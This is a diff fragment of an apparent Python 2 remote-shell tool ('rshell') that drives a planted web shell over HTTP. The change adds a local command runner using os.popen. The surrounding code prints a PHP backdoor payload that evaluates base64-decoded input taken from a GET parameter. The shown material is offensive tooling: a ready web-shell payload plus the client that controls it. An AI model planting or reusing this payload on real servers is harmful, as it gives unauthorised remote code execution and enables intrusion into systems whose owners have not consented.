@@ -4,6 +4,7 @@ import httplib
 from urlparse import urlparse
 from urllib import quote_plus
 from cmd import Cmd
+import os
 
 
 
@@ -58,6 +59,10 @@ class rshell(Cmd):
                 print response.status
         else:
             print "Can't connect"
+
+    def do_shell(self, line):
+        #This method execute the command locally
+        print os.popen(line).read()
 
     def print_payload(self):
         print "<?php eval(base64_decode($_GET['param'])); ?>"
